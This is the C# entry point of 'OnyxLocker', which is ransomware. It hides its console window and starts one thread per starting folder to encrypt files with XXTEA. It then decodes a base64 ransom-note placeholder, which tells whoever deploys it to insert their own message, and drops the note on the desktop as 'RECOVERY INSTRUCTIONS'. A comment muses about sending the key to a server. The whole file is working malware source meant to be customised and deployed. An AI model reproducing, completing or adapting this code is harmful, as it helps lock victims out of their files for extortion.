using OnyxLocker.Classes;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading;

namespace OnyxLocker
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;

        public class DummyParser : IFileParser
        {
            public void ParseFile(string filePath)
            {
                System.Threading.Thread.Sleep(1);
                Console.WriteLine("Parsing files");
            }
        }

        private static void Main(string[] args)
        {
            System.Threading.Thread.Sleep(1);
            var handle = GetConsoleWindow();
            // Hide
            ShowWindow(handle, SW_HIDE);

            IEncryptionProvider encryptionProvider = new XxteaEncryptionProvider();
            IFileParser fileParser = new FileParser(encryptionProvider);
            // IFileParser fileParser = new DummyParser();
            IFileChecker fileChecker = new FileChecker();

            IDriveExplorer driveExplorer = new FolderBrowser();

            var startFolders = driveExplorer.GetStartingFolders();
            var encryptionThreads = GetEncryptionThreads(startFolders, new DirWalker(fileChecker, fileParser));
            encryptionThreads.ForEach(encThread =>
            {
                encThread.Start();
            });

            // Transmit to server maybe?
            var encryptionKey = encryptionProvider.GetEncryptionKey();

            var recoveryBytes = Convert.FromBase64String("WW91IHNob3VsZCByZXBsYWNlIHRoaXMgbWVzc2FnZSB3aXRoIHRoZSBvbmUgeW91IHdhbnQgeW91ciB1c2VycyB0byBzZWUu");
            var recoveryMessage = System.Text.Encoding.UTF8.GetString(recoveryBytes);

            var messageWriter = new MessageWriter(recoveryMessage, "RECOVERY INSTRUCTIONS", 10);
            messageWriter.WriteMessageToDesktop();

            encryptionThreads.ForEach(encThread =>
            {
                if (encThread != null) encThread.Join();
            });
        }

        private static List<Thread> GetEncryptionThreads(List<string> startFolders, DirWalker directoryWalker)
        {
            var encryptionThreads = new List<Thread>();

            foreach (var folder in startFolders)
            {
                encryptionThreads.Add(new Thread(() => directoryWalker.TraverseDirectories(folder)));
            }

            return encryptionThreads;
        }
    }
}